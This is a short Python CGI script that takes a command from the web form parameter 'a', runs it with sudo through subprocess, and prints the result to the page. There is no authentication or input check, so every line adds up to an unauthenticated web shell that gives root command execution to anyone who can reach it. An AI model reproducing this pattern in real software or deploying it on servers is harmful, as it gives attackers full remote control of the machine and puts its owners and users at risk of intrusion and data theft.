#!/usr/bin/python3
import cgi
import subprocess as y
print("content-type:text/html")
print()


form=cgi.FieldStorage()
cmd=form.getvalue('a')
output=y.getoutput("sudo " + cmd)
print(output) 

